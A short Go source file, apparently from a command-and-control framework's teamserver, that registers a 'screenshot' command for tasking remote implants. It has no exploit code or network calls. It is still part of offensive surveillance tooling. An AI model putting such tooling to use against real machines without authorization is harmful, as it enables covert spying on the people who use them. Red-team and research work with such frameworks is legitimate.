package commands

import (
	"simplec2/teamserver/data"
)

// CommandIDScreenshot 截图命令 ID
const CommandIDScreenshot uint32 = 11

// ScreenshotConverter 截图命令转换器
type ScreenshotConverter struct{}

func init() {
	Register(&ScreenshotConverter{})
}

func (c *ScreenshotConverter) Name() string {
	return "screenshot"
}

func (c *ScreenshotConverter) CommandID() uint32 {
	return CommandIDScreenshot
}

func (c *ScreenshotConverter) Convert(task *data.Task) ([]byte, error) {
	// 截图命令不需要参数
	return nil, nil
}
